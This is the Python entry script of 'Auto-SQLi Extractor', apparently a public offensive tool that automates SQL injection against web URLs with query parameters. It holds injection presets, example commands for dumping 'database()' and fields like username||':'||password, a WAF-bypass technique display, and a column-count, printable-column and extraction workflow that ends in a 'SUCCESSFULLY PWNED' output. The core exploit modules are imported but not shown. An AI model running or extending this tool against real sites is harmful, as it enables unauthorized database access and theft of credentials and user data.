# -*- coding: utf-8 -*-
import argparse
import sys
import urllib.parse
from typing import Tuple, Dict
from core.scanner import Scanner
from core.exploiter import Exploiter
from core.updater import intelligence_updater, WAFBypassIntelligence
from core.payload_manager import payload_manager
from utils.colors import C_GREEN, C_RED, C_YELLOW, C_BLUE, C_RESET


# Injection type presets (prefix, suffix)
INJECTION_PRESETS = {
    "numeric": ("", "LIMIT 1"),
    "numeric-comment": ("", "-- -"),
    "quote": ("'", "-- -"),
    "quote-paren": ("')", "-- -"),
    "double-quote": ('"', "-- -"),
    "backtick": ("`", "-- -"),
}

INJECTION_EXAMPLES = """
Common SQL Injection Types:
  numeric     : Parameter is numeric (e.g. ?id=1)
                Command: main.py -u "...?id=999" --preset numeric
  
  numeric-comment: Numeric parameter with comment (e.g. ?id=1)
                   Command: main.py -u "...?id=999" --preset numeric-comment
  
  quote       : Parameter in string (e.g. ?name='admin')
                Command: main.py -u "...?name=admin" --preset quote
  
  quote-paren : String in function (e.g. WHERE id IN (1))
                Command: main.py -u "...?id=1" --preset quote-paren
  
  Error? Try these methods:
    [1] Change --suffix: --suffix "-- +" or --suffix "#"
    [2] Change --prefix or try --preset options
    [3] Use non-existent value (e.g. ?id=999999)
"""


def print_banner() -> None:
    """Print application banner."""
    banner = rf"""{C_BLUE}
    ___         __             _____ ____  __    _ 
   /   | __  __/ /_____       / ___// __ \/ /   (_)
  / /| |/ / / / __/ __ \______\__ \/ / / / /   / / 
 / ___ / /_/ / /_/ /_/ /_____/__/ / /_/ / /___/ /  
/_/  |_\__,_/\__/\____/     /____/\___\_\____/_/   
                                                   
    {C_YELLOW}Auto-SQLi Extractor v1.0{C_RESET}
    {C_GREEN}Author: tunadafish{C_RESET}
    """
    print(banner)


def is_valid_url(url: str) -> Tuple[bool, str]:
    """
    Validate URL format.
    
    Requirements:
    - Must start with http:// or https://
    - Must contain query parameter (?)
    """
    if not url or not isinstance(url, str):
        return False, "URL must be a non-empty string"
    
    if not url.startswith(("http://", "https://")):
        return False, "URL must start with http:// or https://"
    
    if "?" not in url:
        return False, "Target URL must contain parameter (Example: ?id=1). Tool currently does not support scanning URLs without parameters."
    
    return True, "Valid"


def print_suggestions() -> None:
    """Print injection type suggestions."""
    print(INJECTION_EXAMPLES)


def show_intelligence_status() -> None:
    """Hiển thị status của Intelligence System"""
    status = intelligence_updater.get_status()
    
    print(f"\n{C_BLUE}{'='*60}{C_RESET}")
    print(f"{C_BLUE}    INTELLIGENCE SYSTEM STATUS{C_RESET}")
    print(f"{C_BLUE}{'='*60}{C_RESET}\n")
    
    print(f"{C_GREEN}✓ Scheduler Status:{C_RESET} ", end="")
    print(f"{C_GREEN}RUNNING{C_RESET}" if status['scheduler_running'] else f"{C_RED}STOPPED{C_RESET}")
    
    print(f"{C_GREEN}✓ Total Payloads:{C_RESET} {status['total_payloads']}")
    print(f"{C_GREEN}✓ Last Updated:{C_RESET} {status['last_updated']}")
    print(f"{C_GREEN}✓ Scheduled Jobs:{C_RESET} {status['scheduled_jobs']}")
    
    print(f"\n{C_GREEN}Data Sources:{C_RESET}")
    for source in status['sources']:
        print(f"  • {source}")
    
    print(f"\n{C_BLUE}{'='*60}{C_RESET}\n")


def show_waf_bypass_techniques() -> None:
    """Hiển thị tất cả WAF bypass techniques"""
    techniques = WAFBypassIntelligence.get_all_techniques()
    
    print(f"\n{C_BLUE}{'='*60}{C_RESET}")
    print(f"{C_BLUE}    WAF BYPASS TECHNIQUES DATABASE{C_RESET}")
    print(f"{C_BLUE}{'='*60}{C_RESET}\n")
    
    for category, items in techniques.items():
        print(f"{C_YELLOW}[{category.upper()}]{C_RESET}")
        for item in items:
            print(f"  • {C_GREEN}{item.get('name')}{C_RESET}: {item.get('description')}")
            if 'example' in item:
                print(f"    Example: {C_BLUE}{item['example']}{C_RESET}")
            if 'note' in item:
                print(f"    Note: {item['note']}")
        print()
    
    print(f"{C_BLUE}{'='*60}{C_RESET}\n")


def show_payloads_db() -> None:
    """Hiển thị database payloads hiện tại"""
    metadata = payload_manager.get_metadata()
    
    print(f"\n{C_BLUE}{'='*60}{C_RESET}")
    print(f"{C_BLUE}    PAYLOAD DATABASE{C_RESET}")
    print(f"{C_BLUE}{'='*60}{C_RESET}\n")
    
    print(f"{C_GREEN}Total Payloads:{C_RESET} {metadata.get('total_payloads')}")
    print(f"{C_GREEN}Last Updated:{C_RESET} {metadata.get('updated')}")
    print(f"\n{C_GREEN}Sources:{C_RESET}")
    for source in metadata.get('sources', []):
        print(f"  • {source}")
    
    print(f"\n{C_BLUE}{'='*60}{C_RESET}\n")


def print_suggestions() -> None:
    """Print injection type suggestions."""
    print(INJECTION_EXAMPLES)


def main() -> None:
    """Main entry point for AutoSQLi tool."""
    parser = argparse.ArgumentParser(
        description="Auto-SQLi Extractor - Automated SQL Injection exploitation tool",
        epilog="Examples:\n"
               "  python main.py -u 'http://site.com/page.php?id=999' --preset numeric -d 'database()'\n"
               "  python main.py -u 'http://site.com/page.php?name=admin' --preset quote -d 'version()' -T users\n"
               "  python main.py -u 'http://site.com/page.php?id=1' -p \"\" -s 'LIMIT 1' -d 'group_concat(name)'\n",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(
        "-u", "--url",
        required=False,
        help="Target URL with parameter (e.g. http://site.com/page.php?id=1 or ?name=admin)"
    )
    parser.add_argument(
        "--preset",
        choices=list(INJECTION_PRESETS.keys()),
        help=f"Preset injection type ({', '.join(INJECTION_PRESETS.keys())}). Automatically sets prefix and suffix."
    )
    parser.add_argument(
        "-p", "--prefix",
        default=None,
        help="Context closing character (e.g. ' or \"). [Default: from --preset]"
    )
    parser.add_argument(
        "-s", "--suffix",
        default=None,
        help="Comment/end character (e.g. -- - or -- or /* or LIMIT 1). [Default: from --preset]"
    )
    parser.add_argument(
        "-d", "--dump",
        default="database()",
        help="SQL syntax to extract (e.g. username||':'||password). [Default: database()]"
    )
    parser.add_argument(
        "-T", "--table",
        default="",
        help="Table name to extract from (e.g. users). [Default: all db]"
    )
    parser.add_argument(
        "--list-presets",
        action="store_true",
        help="Show list of injection presets and examples"
    )
    
    # Intelligence System Arguments
    parser.add_argument(
        "--update-database",
        action="store_true",
        help="Update payload database from all sources (OWASP, GitHub, PortSwigger, CVE)"
    )
    parser.add_argument(
        "--schedule-updates",
        action="store_true",
        help="Enable automatic daily updates (runs at 2:00 AM)"
    )
    parser.add_argument(
        "--update-status",
        action="store_true",
        help="Show Intelligence System status"
    )
    parser.add_argument(
        "--show-waf-bypass",
        action="store_true",
        help="Show all WAF bypass techniques"
    )
    parser.add_argument(
        "--show-payloads",
        action="store_true",
        help="Show payload database information"
    )
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    args = parser.parse_args()
    
    # Show presets if requested
    if args.list_presets:
        print_suggestions()
        sys.exit(0)
    
    # Handle Intelligence System commands
    if args.update_database:
        intelligence_updater.run_full_update()
        sys.exit(0)
    
    if args.schedule_updates:
        intelligence_updater.schedule_daily_updates(hour=2, minute=0)
        intelligence_updater.start_scheduler()
        print(f"\n{C_GREEN}✓ Scheduler started! Press Ctrl+C to stop.{C_RESET}")
        try:
            import time
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            intelligence_updater.stop_scheduler()
            sys.exit(0)
    
    if args.update_status:
        show_intelligence_status()
        sys.exit(0)
    
    if args.show_waf_bypass:
        show_waf_bypass_techniques()
        sys.exit(0)
    
    if args.show_payloads:
        show_payloads_db()
        sys.exit(0)
    
    # Check URL is required if not showing presets
    if not args.url:
        print(f"{C_RED}[!] Error: -u/--url is required (unless using --list-presets){C_RESET}")
        parser.print_help()
        sys.exit(1)
    
    target_url = args.url

    print_banner()

    # Validate URL
    is_valid, msg = is_valid_url(target_url)
    if not is_valid:
        print(f"{C_RED}[!] INPUT ERROR: {msg}{C_RESET}")
        sys.exit(1)

    # Apply preset if specified
    if args.preset:
        preset_prefix, preset_suffix = INJECTION_PRESETS[args.preset]
        prefix = args.prefix if args.prefix is not None else preset_prefix
        suffix = args.suffix if args.suffix is not None else preset_suffix
        print(f"{C_YELLOW}[*] Using preset '{args.preset}'{C_RESET}")
    else:
        # Use provided values or defaults
        prefix = args.prefix if args.prefix is not None else ""
        suffix = args.suffix if args.suffix is not None else "-- -"

    try:
        print(f"{C_YELLOW}[*] Target: {target_url}{C_RESET}")
        print(f"{C_YELLOW}[*] Prefix: [{prefix}] | Suffix: [{suffix}]{C_RESET}")
        print(f"{C_YELLOW}[*] Dump: [{args.dump}]{C_RESET}")
        if args.table:
            print(f"{C_YELLOW}[*] Table: [{args.table}]{C_RESET}")
        print()

        print(f"{C_BLUE}[>>>] EXPLOITATION PHASE{C_RESET}")
        
        # Initialize exploiter
        exploiter = Exploiter(target_url, prefix=prefix, suffix=suffix)
        
        # Step 1: Detect column count
        cols = exploiter.get_column_count()
        if cols == 0:
            print(f"\n{C_RED}[!] DETECTION FAILED - Cannot find column count{C_RESET}")
            print(f"\n{C_YELLOW}[*] SUGGESTIONS:{C_RESET}")
            print(f"  1) Change --suffix:")
            print(f"     --suffix \"-- +\"")
            print(f"     --suffix \"#\"")
            print(f"     --suffix \"LIMIT 1\"")
            print(f"  2) Change --preset:")
            for preset_name in INJECTION_PRESETS.keys():
                print(f"     --preset {preset_name}")
            print(f"  3) Try different value:")
            current_param = target_url.split("=")[-1]
            print(f"     Replace {current_param} with 999 or -1")
            print(f"\n{C_YELLOW}[*] Or use --list-presets for detailed examples{C_RESET}\n")
            sys.exit(0)
        
        # Step 2: Find printable column
        printable_col = exploiter.get_printable_column(cols)
        if printable_col == 0:
            print(f"\n{C_RED}[!] DETECTION FAILED - Cannot find Text column to display{C_RESET}")
            print(f"{C_YELLOW}[*] SUGGESTIONS:{C_RESET}")
            print(f"  • Database has {cols} columns but no displayable column found")
            print(f"  • Try these commands:")
            print(f"    --suffix \"-- +\"")
            print(f"    --suffix \"#\"")
            print(f"    -p \"'\" (if quote-based)")
            print(f"\n{C_YELLOW}[*] Or use --list-presets for examples{C_RESET}\n")
            sys.exit(0)

        print(f"\n{C_BLUE}[>>>] DATA EXTRACTION PHASE{C_RESET}")
        
        # Step 3: Extract data
        data_list = exploiter.dump_custom_data(
            cols, 
            printable_col, 
            args.dump, 
            args.table
        )
        
        if data_list:
            print(f"\n{C_GREEN} [V] SUCCESSFULLY PWNED! EXTRACTED RESULT:{C_RESET}")
            print(f"{C_GREEN}========================================={C_RESET}")
            for item in data_list:
                if item and item != "133789":
                    print(f" {C_YELLOW}> {item}{C_RESET}")
            print(f"{C_GREEN}========================================={C_RESET}\n")
        else:
            print(f"{C_RED}[-] Failed to extract data. Check your --dump syntax.{C_RESET}")

    except KeyboardInterrupt:
        print(f"\n{C_RED}[!] Exiting...{C_RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{C_RED}[!] Unexpected error: {str(e)}{C_RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()